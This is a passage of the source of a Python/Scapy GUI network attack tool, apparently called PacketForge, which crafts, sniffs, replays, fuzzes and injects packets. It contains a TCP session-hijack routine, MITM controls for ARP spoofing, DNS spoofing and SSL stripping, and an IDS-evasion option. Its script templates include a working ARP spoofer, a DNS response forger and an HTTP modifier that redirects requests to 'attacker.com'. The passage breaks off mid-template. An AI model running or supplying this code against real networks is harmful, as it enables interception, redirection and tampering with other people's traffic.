                domain = self.payload_text.get("1.0", tk.END).strip() or "example.com"
                
                # Create the packet
                packet = IP(src=src_ip, dst=dst_ip)/UDP(sport=src_port, dport=dst_port)/DNS(
                    rd=1, qd=DNSQR(qname=domain)
                )
                
            elif protocol == "HTTP":
                src_port = int(self.src_port.get() or "12345")
                dst_port = int(self.dst_port.get() or "80")
                
                # Create HTTP request from payload or use default
                http_payload = self.payload_text.get("1.0", tk.END).strip()
                if not http_payload:
                    http_payload = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
                
                # Create the packet
                packet = IP(src=src_ip, dst=dst_ip)/TCP(
                    sport=src_port, dport=dst_port, flags="PA"
                )/http_payload
                
            else:  # Raw
                # Create a raw IP packet
                packet = IP(src=src_ip, dst=dst_ip)
                
                # Add payload if provided
                payload = self.payload_text.get("1.0", tk.END).strip()
                if payload:
                    packet = packet/Raw(load=payload)
            
            # Show packet preview
            self.packet_preview.delete("1.0", tk.END)
            self.packet_preview.insert("1.0", packet.show(dump=True))
            
            # Store the packet for later use
            self.current_packet = packet
            
            self.log(f"Packet crafted successfully: {protocol}")
            return packet
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to craft packet: {str(e)}")
            return None
    
    def send_packet(self):
        """Send the crafted packet"""
        packet = getattr(self, 'current_packet', None)
        if not packet:
            packet = self.craft_packet()
            
        if packet:
            try:
                # Get selected interface
                iface = self.interfaces.get(self.selected_interface.get(), None)
                
                # Send the packet
                send(packet, iface=iface, verbose=0)
                
                self.log(f"Packet sent successfully on interface {iface}")
                messagebox.showinfo("Success", "Packet sent successfully")
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to send packet: {str(e)}")
    
    def save_packet_template(self):
        """Save the current packet as a template"""
        packet = getattr(self, 'current_packet', None)
        if not packet:
            packet = self.craft_packet()
            
        if packet:
            try:
                filepath = filedialog.asksaveasfilename(
                    defaultextension=".json",
                    filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                    title="Save Packet Template"
                )
                
                if not filepath:
                    return
                
                # Collect template data
                template_data = {
                    "protocol": self.protocol.get(),
                    "src_ip": self.src_ip.get(),
                    "dst_ip": self.dst_ip.get(),
                    "src_port": self.src_port.get(),
                    "dst_port": self.dst_port.get(),
                    "ttl": self.ttl.get(),
                    "flags": self.flags.get(),
                    "window": self.window.get(),
                    "payload": self.payload_text.get("1.0", tk.END).strip()
                }
                
                # Save to file
                with open(filepath, 'w') as f:
                    json.dump(template_data, f, indent=4)
                
                self.log(f"Packet template saved to {filepath}")
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save template: {str(e)}")
    
    def load_packet_template(self):
        """Load a packet template from file"""
        try:
            filepath = filedialog.askopenfilename(
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Load Packet Template"
            )
            
            if not filepath:
                return
            
            # Load from file
            with open(filepath, 'r') as f:
                template_data = json.load(f)
            
            # Apply template data to the UI
            self.protocol.set(template_data.get("protocol", "TCP"))
            self.src_ip.delete(0, tk.END)
            self.src_ip.insert(0, template_data.get("src_ip", ""))
            self.dst_ip.delete(0, tk.END)
            self.dst_ip.insert(0, template_data.get("dst_ip", ""))
            self.src_port.delete(0, tk.END)
            self.src_port.insert(0, template_data.get("src_port", ""))
            self.dst_port.delete(0, tk.END)
            self.dst_port.insert(0, template_data.get("dst_port", ""))
            self.ttl.delete(0, tk.END)
            self.ttl.insert(0, template_data.get("ttl", "64"))
            self.flags.delete(0, tk.END)
            self.flags.insert(0, template_data.get("flags", "S"))
            self.window.delete(0, tk.END)
            self.window.insert(0, template_data.get("window", "8192"))
            self.payload_text.delete("1.0", tk.END)
            self.payload_text.insert("1.0", template_data.get("payload", ""))
            
            self.log(f"Packet template loaded from {filepath}")
            
            # Craft the packet
            self.craft_packet()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load template: {str(e)}")
    
    # ====== Packet Capture Methods ======
    def toggle_capture(self):
        """Toggle packet capture on/off"""
        if not self.packet_capture_active:
            # Start capture
            try:
                self.packet_capture_active = True
                self.capture_btn.config(text="Stop Capture")
                
                # Get selected interface
                iface = self.interfaces.get(self.selected_interface.get(), None)
                
                # Get filter
                packet_filter = self.capture_filter.get()
                
                # Clear previous packets
                self.packet_tree.delete(*self.packet_tree.get_children())
                self.captured_packets = []
                
                # Start capture in a separate thread
                self.capture_thread = threading.Thread(
                    target=self.capture_packets,
                    args=(iface, packet_filter),
                    daemon=True
                )
                self.capture_thread.start()
                
                self.log(f"Packet capture started on interface {iface}")
                
            except Exception as e:
                self.packet_capture_active = False
                self.capture_btn.config(text="Start Capture")
                messagebox.showerror("Error", f"Failed to start packet capture: {str(e)}")
        else:
            # Stop capture
            self.packet_capture_active = False
            self.capture_btn.config(text="Start Capture")
            self.log("Packet capture stopped")
    
    def capture_packets(self, iface, packet_filter):
        """Capture packets in a background thread"""
        try:
            # Start packet capture using Scapy's sniff function
            sniff(
                iface=iface,
                filter=packet_filter,
                prn=self.process_packet,
                store=0,
                stop_filter=lambda p: not self.packet_capture_active
            )
        except Exception as e:
            self.log(f"Packet capture error: {str(e)}", "ERROR")
            self.packet_capture_active = False
            self.root.after(0, lambda: self.capture_btn.config(text="Start Capture"))
    
    def process_packet(self, packet):
        """Process a captured packet and add it to the UI"""
        try:
            # Create a packet entry for the UI
            packet_time = time.strftime("%H:%M:%S")
            packet_src = packet[0].src if IP in packet else "Unknown"
            packet_dst = packet[0].dst if IP in packet else "Unknown"
            packet_proto = "Unknown"
            packet_len = len(packet)
            packet_info = "Unknown packet"
            
            # Determine protocol and info
            if TCP in packet:
                packet_proto = "TCP"
                sport = packet[TCP].sport
                dport = packet[TCP].dport
                flags = packet[TCP].flags
                packet_info = f"{sport} → {dport} [Flags: {flags}]"
                
                # Check for application protocols
                if dport == 80 or dport == 443:
                    packet_proto = "HTTP(S)"
                    if Raw in packet:
                        payload = packet[Raw].load.decode('utf-8', 'ignore')
                        if payload.startswith("GET") or payload.startswith("POST"):
                            first_line = payload.split("\r\n")[0]
                            packet_info = first_line
                        
            elif UDP in packet:
                packet_proto = "UDP"
                sport = packet[UDP].sport
                dport = packet[UDP].dport
                packet_info = f"{sport} → {dport}"
                
                # Check for DNS
                if dport == 53 or sport == 53:
                    packet_proto = "DNS"
                    if DNS in packet:
                        if packet[DNS].qr == 0:
                            query_name = packet[DNS].qd.qname.decode('utf-8')
                            packet_info = f"Query: {query_name}"
                        else:
                            packet_info = f"Response: {packet[DNS].ancount} answers"
                        
            elif ICMP in packet:
                packet_proto = "ICMP"
                icmp_type = packet[ICMP].type
                icmp_code = packet[ICMP].code
                packet_info = f"Type: {icmp_type}, Code: {icmp_code}"
                
            elif ARP in packet:
                packet_proto = "ARP"
                op = "Request" if packet[ARP].op == 1 else "Reply"
                packet_info = f"{op}: Who has {packet[ARP].pdst}? Tell {packet[ARP].psrc}"
                
            # Add to the UI
            packet_id = len(self.captured_packets) + 1
            self.root.after(0, lambda: self.packet_tree.insert('', 'end', values=(
                packet_id, packet_time, packet_src, packet_dst, packet_proto, packet_len, packet_info
            )))
            
            # Store the packet
            self.captured_packets.append(packet)
            
        except Exception as e:
            self.log(f"Error processing packet: {str(e)}", "ERROR")
    
    def display_packet_details(self, event):
        """Display details of the selected packet"""
        selection = self.packet_tree.selection()
        if not selection:
            return
            
        # Get the selected packet
        item = self.packet_tree.item(selection[0])
        packet_id = int(item['values'][0]) - 1
        
        if 0 <= packet_id < len(self.captured_packets):
            packet = self.captured_packets[packet_id]
            
            # Display packet details
            self.packet_details.delete("1.0", tk.END)
            self.packet_details.insert("1.0", packet.show(dump=True))
            
            # Display hex view
            self.packet_hex.delete("1.0", tk.END)
            
            # Create hex dump
            hex_dump = hexdump(packet, dump=True)
            self.packet_hex.insert("1.0", hex_dump)
    
    def clear_capture(self):
        """Clear the packet capture"""
        self.packet_tree.delete(*self.packet_tree.get_children())
        self.packet_details.delete("1.0", tk.END)
        self.packet_hex.delete("1.0", tk.END)
        self.captured_packets = []
        self.log("Packet capture cleared")
    
    def save_pcap(self):
        """Save captured packets to a PCAP file"""
        if not self.captured_packets:
            messagebox.showinfo("Info", "No packets to save")
            return
            
        try:
            filepath = filedialog.asksaveasfilename(
                defaultextension=".pcap",
                filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")],
                title="Save Packets"
            )
            
            if not filepath:
                return
                
            # Write packets to PCAP file
            wrpcap(filepath, self.captured_packets)
            
            self.log(f"Saved {len(self.captured_packets)} packets to {filepath}")
            messagebox.showinfo("Success", f"Saved {len(self.captured_packets)} packets to file")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save PCAP file: {str(e)}")
    
    def load_pcap(self):
        """Load packets from a PCAP file"""
        try:
            filepath = filedialog.askopenfilename(
                filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")],
                title="Load PCAP"
            )
            
            if not filepath:
                return
                
            # Clear existing packets
            self.clear_capture()
            
            # Read packets
            packets = rdpcap(filepath)
            
            # Process each packet
            for packet in packets:
                self.process_packet(packet)
                
            self.log(f"Loaded {len(packets)} packets from {filepath}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load PCAP file: {str(e)}")
    
    def replay_packet(self):
        """Replay the selected packet"""
        selection = self.packet_tree.selection()
        if not selection:
            messagebox.showinfo("Info", "No packet selected")
            return
            
        # Get the selected packet
        item = self.packet_tree.item(selection[0])
        packet_id = int(item['values'][0]) - 1
        
        if 0 <= packet_id < len(self.captured_packets):
            try:
                packet = self.captured_packets[packet_id]
                
                # Get selected interface
                iface = self.interfaces.get(self.selected_interface.get(), None)
                
                # Send the packet
                send(packet, iface=iface, verbose=0)
                
                self.log(f"Replayed packet {packet_id+1} on interface {iface}")
                messagebox.showinfo("Success", "Packet replayed successfully")
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to replay packet: {str(e)}")
    
    def modify_and_inject(self):
        """Modify the selected packet and inject it"""
        selection = self.packet_tree.selection()
        if not selection:
            messagebox.showinfo("Info", "No packet selected")
            return
            
        # Get the selected packet
        item = self.packet_tree.item(selection[0])
        packet_id = int(item['values'][0]) - 1
        
        if 0 <= packet_id < len(self.captured_packets):
            packet = self.captured_packets[packet_id]
            
            # Create a new window for modification
            mod_window = tk.Toplevel(self.root)
            mod_window.title("Modify Packet")
            mod_window.geometry("800x600")
            
            # Packet display
            ttk.Label(mod_window, text="Original Packet:").pack(anchor=tk.W, padx=10, pady=5)
            
            original_packet = scrolledtext.ScrolledText(mod_window, wrap=tk.WORD, height=10)
            original_packet.pack(fill=tk.X, padx=10, pady=5)
            original_packet.insert("1.0", packet.show(dump=True))
            
            # Modification area
            ttk.Label(mod_window, text="Modified Packet (Scapy notation):").pack(anchor=tk.W, padx=10, pady=5)
            
            packet_code = scrolledtext.ScrolledText(mod_window, wrap=tk.WORD, height=15)
            packet_code.pack(fill=tk.X, padx=10, pady=5)
            
            # Generate initial code
            packet_repr = repr(packet)
            packet_code.insert("1.0", f"# Modify this packet\npacket = {packet_repr}\n\n# Example modifications:\n# packet[IP].dst = '192.168.1.1'\n# packet[TCP].dport = 8080\n# packet[TCP].flags = 'A'\n# del packet[IP].chksum  # Force recalculation\n# del packet[TCP].chksum  # Force recalculation")
            
            # Control buttons
            btn_frame = ttk.Frame(mod_window)
            btn_frame.pack(fill=tk.X, padx=10, pady=10)
            
            ttk.Button(btn_frame, text="Inject Modified Packet", 
                     command=lambda: self.inject_modified_packet(packet, packet_code.get("1.0", tk.END), mod_window)
                     ).pack(side=tk.LEFT, padx=5)
            
            ttk.Button(btn_frame, text="Cancel", 
                     command=mod_window.destroy).pack(side=tk.LEFT, padx=5)
    
    def inject_modified_packet(self, original_packet, code, window):
        """Execute the modification code and inject the modified packet"""
        try:
            # Create a local namespace for the code execution
            local_vars = {
                'packet': original_packet.copy(),
                'IP': IP,
                'TCP': TCP,
                'UDP': UDP,
                'ICMP': ICMP,
                'ARP': ARP,
                'DNS': DNS,
                'Raw': Raw
            }
            
            # Execute the code
            exec(code, globals(), local_vars)
            
            # Get the modified packet
            modified_packet = local_vars.get('packet', None)
            
            if not modified_packet:
                raise ValueError("No packet variable found in the code")
                
            # Get selected interface
            iface = self.interfaces.get(self.selected_interface.get(), None)
            
            # Send the modified packet
            send(modified_packet, iface=iface, verbose=0)
            
            self.log(f"Injected modified packet on interface {iface}")
            messagebox.showinfo("Success", "Modified packet injected successfully")
            window.destroy()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to inject modified packet: {str(e)}")

    def hijack_session(self):
        """Attempt TCP session hijacking on the selected packet"""
        selection = self.packet_tree.selection()
        if not selection:
            messagebox.showinfo("Info", "No packet selected")
            return
            
        # Get the selected packet
        item = self.packet_tree.item(selection[0])
        packet_id = int(item['values'][0]) - 1
        
        if 0 <= packet_id < len(self.captured_packets):
            packet = self.captured_packets[packet_id]
            
            if TCP not in packet:
                messagebox.showinfo("Info", "Selected packet is not a TCP packet")
                return
                
            try:
                # Create a hijacked packet
                hijacked_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / \
                                TCP(sport=packet[TCP].sport, 
                                   dport=packet[TCP].dport,
                                   seq=packet[TCP].seq + 1,
                                   ack=packet[TCP].ack,
                                   flags="PA") / \
                                "Hijacked session data"
                
                # Get selected interface
                iface = self.interfaces.get(self.selected_interface.get(), None)
                
                # Send the hijacked packet
                send(hijacked_packet, iface=iface, verbose=0)
                
                self.log(f"Attempted TCP session hijacking on interface {iface}")
                messagebox.showinfo("Success", "TCP session hijacking attempted")
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to hijack TCP session: {str(e)}")

    # ====== MITM Methods ======
    def toggle_mitm(self):
        """Toggle MITM attack on/off"""
        if not self.mitm_active:
            # Start MITM attack
            try:
                target1 = self.target1_ip.get()
                target2 = self.target2_ip.get()
                
                if not target1 or not target2:
                    messagebox.showwarning("Warning", "Both target IPs are required")
                    return
                    
                self.mitm_active = True
                self.mitm_btn.config(text="Stop MitM Attack")
                
                # Get selected interface
                iface = self.interfaces.get(self.selected_interface.get(), None)
                
                # Start MITM in a separate thread
                self.mitm_thread = threading.Thread(
                    target=self.run_mitm_attack,
                    args=(iface, target1, target2),
                    daemon=True
                )
                self.mitm_thread.start()
                
                self.log(f"MITM attack started between {target1} and {target2}")
                
            except Exception as e:
                self.mitm_active = False
                self.mitm_btn.config(text="Start MitM Attack")
                messagebox.showerror("Error", f"Failed to start MITM attack: {str(e)}")
        else:
            # Stop MITM attack
            self.mitm_active = False
            self.mitm_btn.config(text="Start MitM Attack")
            self.log("MITM attack stopped")

    def run_mitm_attack(self, iface, target1, target2):
        """Run the MITM attack in a background thread"""
        try:
            # ARP spoofing
            if self.use_arp_spoofing.get():
                self.log("Starting ARP spoofing...")
                
            # DNS spoofing
            if self.use_dns_spoofing.get():
                self.log("Starting DNS spoofing...")
                
            # SSL stripping
            if self.use_ssl_strip.get():
                self.log("Starting SSL stripping...")
                
            # Session hijacking
            if self.use_session_hijacking.get():
                self.log("Monitoring for session hijacking opportunities...")
                
            # Main MITM loop
            while self.mitm_active:
                time.sleep(1)
                
        except Exception as e:
            self.log(f"MITM attack error: {str(e)}", "ERROR")
            self.mitm_active = False
            self.root.after(0, lambda: self.mitm_btn.config(text="Start MitM Attack"))

    def add_dns_rule(self):
        """Add a DNS spoofing rule"""
        domain = self.spoof_domain.get()
        ip = self.spoof_ip.get()
        
        if not domain or not ip:
            messagebox.showwarning("Warning", "Both domain and IP are required")
            return
            
        self.dns_rules.insert('', 'end', values=(domain, ip))
        self.log(f"Added DNS spoofing rule: {domain} → {ip}")

    def add_modification_rule(self):
        """Add a packet modification rule"""
        match_pattern = self.match_pattern.get()
        replace_pattern = self.replace_pattern.get()
        
        if not match_pattern or not replace_pattern:
            messagebox.showwarning("Warning", "Both match and replace patterns are required")
            return
            
        self.modification_rules.insert('', 'end', values=(match_pattern, replace_pattern))
        self.log(f"Added modification rule: '{match_pattern}' → '{replace_pattern}'")

    def clear_mitm_logs(self):
        """Clear MITM logs"""
        self.traffic_tree.delete(*self.traffic_tree.get_children())
        self.log("MITM logs cleared")

    # ====== Fuzzing Methods ======
    def start_fuzzing(self):
        """Start the fuzzing process"""
        try:
            target_ip = self.fuzz_target_ip.get()
            target_port = self.fuzz_target_port.get()
            
            if not target_ip or not target_port:
                messagebox.showwarning("Warning", "Target IP and port are required")
                return
                
            # Get fuzzing parameters
            fuzz_type = self.fuzz_type.get()
            mutation_rate = int(self.mutation_rate.get())
            num_packets = int(self.num_packets.get())
            delay = int(self.packet_delay.get())
            
            # Clear previous results
            self.fuzzing_log.delete("1.0", tk.END)
            self.fuzzing_summary.delete("1.0", tk.END)
            self.anomalies_tree.delete(*self.anomalies_tree.get_children())
            
            # Start fuzzing in a separate thread
            self.fuzzing_thread = threading.Thread(
                target=self.run_fuzzing,
                args=(target_ip, target_port, fuzz_type, mutation_rate, num_packets, delay),
                daemon=True
            )
            self.fuzzing_thread.start()
            
            self.log(f"Started fuzzing {target_ip}:{target_port} with {fuzz_type}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start fuzzing: {str(e)}")

    def run_fuzzing(self, target_ip, target_port, fuzz_type, mutation_rate, num_packets, delay):
        """Run the fuzzing process in a background thread"""
        try:
            protocol = self.fuzz_protocol.get()
            
            for i in range(num_packets):
                if not hasattr(self, 'fuzzing_thread') or not self.fuzzing_thread.is_alive():
                    break
                    
                try:
                    # Create base packet
                    if protocol == "TCP":
                        packet = IP(dst=target_ip)/TCP(dport=int(target_port))
                    elif protocol == "UDP":
                        packet = IP(dst=target_ip)/UDP(dport=int(target_port))
                    elif protocol == "HTTP":
                        packet = IP(dst=target_ip)/TCP(dport=80)/"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
                    elif protocol == "DNS":
                        packet = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
                    elif protocol == "ICMP":
                        packet = IP(dst=target_ip)/ICMP()
                    
                    # Apply fuzzing
                    fuzzed_packet = self.apply_fuzzing(packet, fuzz_type, mutation_rate)
                    
                    # Send the packet
                    send(fuzzed_packet, verbose=0)
                    
                    # Log the packet
                    self.root.after(0, lambda: self.fuzzing_log.insert(tk.END, f"Sent packet {i+1}/{num_packets}\n"))
                    self.root.after(0, lambda: self.fuzzing_log.see(tk.END))
                    
                    time.sleep(delay / 1000.0)
                    
                except Exception as e:
                    self.root.after(0, lambda: self.fuzzing_log.insert(tk.END, f"Error sending packet {i+1}: {str(e)}\n"))
                    self.root.after(0, lambda: self.fuzzing_log.see(tk.END))
            
            self.root.after(0, lambda: self.fuzzing_log.insert(tk.END, "\nFuzzing completed\n"))
            self.root.after(0, lambda: self.fuzzing_summary.insert(tk.END, f"Fuzzing completed\n\nTarget: {target_ip}:{target_port}\nProtocol: {protocol}\nPackets sent: {num_packets}\n"))
            
        except Exception as e:
            self.log(f"Fuzzing error: {str(e)}", "ERROR")

    def apply_fuzzing(self, packet, fuzz_type, mutation_rate):
        """Apply fuzzing to a packet based on the specified type"""
        # Make a copy of the packet to modify
        fuzzed_packet = packet.copy()
        
        if fuzz_type == "Header Field Mutation":
            # Randomly mutate header fields
            if IP in fuzzed_packet:
                if random.random() < (mutation_rate / 100.0):
                    fuzzed_packet[IP].ttl = random.randint(1, 255)
                if random.random() < (mutation_rate / 100.0):
                    fuzzed_packet[IP].id = random.randint(0, 65535)
            
            if TCP in fuzzed_packet:
                if random.random() < (mutation_rate / 100.0):
                    fuzzed_packet[TCP].sport = random.randint(1024, 65535)
                if random.random() < (mutation_rate / 100.0):
                    fuzzed_packet[TCP].seq = random.randint(0, 2**32-1)
                if random.random() < (mutation_rate / 100.0):
                    fuzzed_packet[TCP].flags = random.choice(['S', 'A', 'P', 'R', 'F'])
                    
        elif fuzz_type == "Payload Mutation":
            # Mutate the payload
            if Raw in fuzzed_packet:
                payload = bytearray(fuzzed_packet[Raw].load)
                for i in range(len(payload)):
                    if random.random() < (mutation_rate / 100.0):
                        payload[i] = random.randint(0, 255)
                fuzzed_packet[Raw].load = bytes(payload)
            else:
                # Add random payload
                if random.random() < (mutation_rate / 100.0):
                    length = random.randint(1, 100)
                    fuzzed_packet = fuzzed_packet/Raw(load=os.urandom(length))
                    
        elif fuzz_type == "Size Mutation":
            # Mutate packet size
            if random.random() < (mutation_rate / 100.0):
                if Raw in fuzzed_packet:
                    current_size = len(fuzzed_packet[Raw].load)
                    new_size = max(1, current_size + random.randint(-50, 50))
                    if new_size > current_size:
                        fuzzed_packet[Raw].load += os.urandom(new_size - current_size)
                    else:
                        fuzzed_packet[Raw].load = fuzzed_packet[Raw].load[:new_size]
                else:
                    length = random.randint(1, 100)
                    fuzzed_packet = fuzzed_packet/Raw(load=os.urandom(length))
                    
        elif fuzz_type == "Protocol Compliance":
            # Test protocol violations
            if TCP in fuzzed_packet:
                if random.random() < (mutation_rate / 100.0):
                    fuzzed_packet[TCP].flags = 'SA'  # SYN-ACK (invalid combination)
                    
        elif fuzz_type == "Boundary Testing":
            # Test boundary conditions
            if IP in fuzzed_packet:
                if random.random() < (mutation_rate / 100.0):
                    fuzzed_packet[IP].len = 0  # Invalid length
                    
        elif fuzz_type == "Random Fuzzing":
            # Randomly fuzz any part of the packet
            if random.random() < (mutation_rate / 100.0):
                layer = random.choice([IP, TCP, UDP, ICMP, Raw])
                if layer in fuzzed_packet:
                    field = random.choice(list(fuzzed_packet[layer].fields.keys()))
                    if isinstance(fuzzed_packet[layer].fields[field], int):
                        fuzzed_packet[layer].fields[field] = random.randint(0, 2**32-1)
                    elif isinstance(fuzzed_packet[layer].fields[field], str):
                        fuzzed_packet[layer].fields[field] = ''.join(random.choice(string.ascii_letters) for _ in range(10))
        
        return fuzzed_packet

    def save_fuzzing_config(self):
        """Save the current fuzzing configuration"""
        try:
            config = {
                "target_ip": self.fuzz_target_ip.get(),
                "target_port": self.fuzz_target_port.get(),
                "protocol": self.fuzz_protocol.get(),
                "fuzz_type": self.fuzz_type.get(),
                "mutation_rate": int(self.mutation_rate.get()),
                "num_packets": self.num_packets.get(),
                "packet_delay": self.packet_delay.get(),
                "evade_ids": self.evade_ids.get(),
                "fragment_packets": self.fragment_packets.get(),
                "randomize_fields": self.randomize_fields.get(),
                "test_boundaries": self.test_boundaries.get()
            }
            
            filepath = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Save Fuzzing Configuration"
            )
            
            if not filepath:
                return
                
            with open(filepath, 'w') as f:
                json.dump(config, f, indent=4)
                
            self.log(f"Fuzzing configuration saved to {filepath}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save configuration: {str(e)}")

    def load_fuzzing_config(self):
        """Load a fuzzing configuration from file"""
        try:
            filepath = filedialog.askopenfilename(
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Load Fuzzing Configuration"
            )
            
            if not filepath:
                return
                
            with open(filepath, 'r') as f:
                config = json.load(f)
                
            # Apply configuration
            self.fuzz_target_ip.delete(0, tk.END)
            self.fuzz_target_ip.insert(0, config.get("target_ip", ""))
            
            self.fuzz_target_port.delete(0, tk.END)
            self.fuzz_target_port.insert(0, config.get("target_port", ""))
            
            self.fuzz_protocol.set(config.get("protocol", "TCP"))
            
            self.fuzz_type.set(config.get("fuzz_type", "Header Field Mutation"))
            
            self.mutation_rate.set(config.get("mutation_rate", 20))
            
            self.num_packets.delete(0, tk.END)
            self.num_packets.insert(0, config.get("num_packets", "100"))
            
            self.packet_delay.delete(0, tk.END)
            self.packet_delay.insert(0, config.get("packet_delay", "10"))
            
            self.evade_ids.set(config.get("evade_ids", False))
            self.fragment_packets.set(config.get("fragment_packets", False))
            self.randomize_fields.set(config.get("randomize_fields", True))
            self.test_boundaries.set(config.get("test_boundaries", True))
            
            self.log(f"Fuzzing configuration loaded from {filepath}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load configuration: {str(e)}")

    def clear_fuzzing_results(self):
        """Clear fuzzing results"""
        self.fuzzing_log.delete("1.0", tk.END)
        self.fuzzing_summary.delete("1.0", tk.END)
        self.anomalies_tree.delete(*self.anomalies_tree.get_children())
        self.log("Fuzzing results cleared")

    # ====== Scripting Methods ======
    def insert_script_template(self):
        """Insert a default script template"""
        template = """# PacketForge Scripting Example
from scapy.all import *

# Configure your script here
target_ip = "192.168.1.1"
target_port = 80
interface = "eth0"

# Example: TCP SYN scan
def tcp_syn_scan():
    print(f"Starting TCP SYN scan of {target_ip}")
    
    # Send SYN packets to ports 1-1024
    ans, unans = sr(IP(dst=target_ip)/TCP(dport=(1,1024), flags="S"), timeout=1, iface=interface)
    
    # Print open ports
    print("Open ports:")
    for s,r in ans:
        if r[TCP].flags == "SA":
            print(f"  {s[TCP].dport}")

# Run the scan
if __name__ == "__main__":
    tcp_syn_scan()
"""
        self.code_editor.insert("1.0", template)

    def new_script(self):
        """Create a new script"""
        self.code_editor.delete("1.0", tk.END)
        self.insert_script_template()
        self.log("Created new script")

    def open_script(self):
        """Open a script file"""
        try:
            filepath = filedialog.askopenfilename(
                filetypes=[("Python files", "*.py"), ("All files", "*.*")],
                title="Open Script"
            )
            
            if not filepath:
                return
                
            with open(filepath, 'r') as f:
                content = f.read()
                
            self.code_editor.delete("1.0", tk.END)
            self.code_editor.insert("1.0", content)
            
            self.log(f"Opened script from {filepath}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to open script: {str(e)}")

    def save_script(self):
        """Save the current script"""
        try:
            filepath = filedialog.asksaveasfilename(
                defaultextension=".py",
                filetypes=[("Python files", "*.py"), ("All files", "*.*")],
                title="Save Script"
            )
            
            if not filepath:
                return
                
            content = self.code_editor.get("1.0", tk.END)
            
            with open(filepath, 'w') as f:
                f.write(content)
                
            self.log(f"Script saved to {filepath}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save script: {str(e)}")

    def run_script(self):
        """Run the current script"""
        try:
            # Clear console output
            self.console_output.delete("1.0", tk.END)
            
            # Get script content
            script = self.code_editor.get("1.0", tk.END)
            
            # Create a local namespace for execution
            local_vars = {
                'IP': IP,
                'TCP': TCP,
                'UDP': UDP,
                'ICMP': ICMP,
                'ARP': ARP,
                'DNS': DNS,
                'Raw': Raw,
                'sr': sr,
                'send': send,
                'sniff': sniff
            }
            
            # Redirect stdout to console output
            import sys
            from io import StringIO
            
            old_stdout = sys.stdout
            sys.stdout = mystdout = StringIO()
            
            # Execute the script
            exec(script, globals(), local_vars)
            
            # Restore stdout
            sys.stdout = old_stdout
            
            # Display output in console
            output = mystdout.getvalue()
            self.console_output.insert("1.0", output)
            
            self.log("Script executed successfully")
            
        except Exception as e:
            self.console_output.insert("1.0", f"Error: {str(e)}\n")
            self.log(f"Script execution failed: {str(e)}", "ERROR")

    def load_template(self, template_name):
        """Load a script template"""
        templates = {
            "TCP SYN Scan": """# TCP SYN Scan
from scapy.all import *

target = "192.168.1.1"
ports = range(1, 1025)
timeout = 1

print(f"Starting TCP SYN scan of {target}")

ans, unans = sr(IP(dst=target)/TCP(dport=ports, flags="S"), timeout=timeout)

print("\\nOpen ports:")
for s,r in ans:
    if r[TCP].flags == "SA":
        print(f"  {s[TCP].dport}")
""",
            "ARP Spoofer": """# ARP Spoofer
from scapy.all import *
import time

target1 = "192.168.1.100"
target2 = "192.168.1.1"
interval = 2

print(f"Starting ARP spoofing between {target1} and {target2}")

try:
    while True:
        send(ARP(op=2, pdst=target1, psrc=target2), verbose=0)
        send(ARP(op=2, pdst=target2, psrc=target1), verbose=0)
        time.sleep(interval)
except KeyboardInterrupt:
    print("\\nStopping ARP spoofing")
""",
            "DNS Hijacker": """# DNS Hijacker
from scapy.all import *

domain = "example.com"
redirect_ip = "192.168.1.100"

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR) and domain in str(pkt[DNSQR].qname):
        print(f"Spoofing DNS response for {pkt[DNSQR].qname}")
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=53)/\
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirect_ip))
        send(spoofed_pkt, verbose=0)

print(f"Spoofing DNS requests for {domain} to {redirect_ip}")
sniff(filter="udp and port 53", prn=dns_spoof)
""",
            "Packet Sniffer": """# Packet Sniffer
from scapy.all import *

def packet_callback(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        proto = packet[IP].proto
        
        if packet.haslayer(TCP):
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            print(f"TCP: {src_ip}:{sport} -> {dst_ip}:{dport}")
        elif packet.haslayer(UDP):
            sport = packet[UDP].sport
            dport = packet[UDP].dport
            print(f"UDP: {src_ip}:{sport} -> {dst_ip}:{dport}")
        else:
            print(f"IP: {src_ip} -> {dst_ip} Protocol: {proto}")

print("Starting packet sniffer...")
sniff(prn=packet_callback, store=0)
""",
            "HTTP Traffic Modifier": """# HTTP Traffic Modifier
from scapy.all import *

def http_modify(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8', 'ignore')
            
            if "HTTP" in payload:
                # Modify HTTP requests
                if "GET" in payload or "POST" in payload:
                    modified_payload = payload.replace("example.com", "attacker.com")
                    
                    # Rebuild packet with modified payload
                    new_packet = packet[IP]
                    del new_packet.chksum
                    del new_packet[TCP].chksum
                    new_packet[TCP].payload = Raw(load=modified_payload.encode())
                    
                    send(new_packet, verbose=0)
                    print("Modified HTTP request")
                    
        except:
            pass

print("Starting HTTP traffic modifier...")
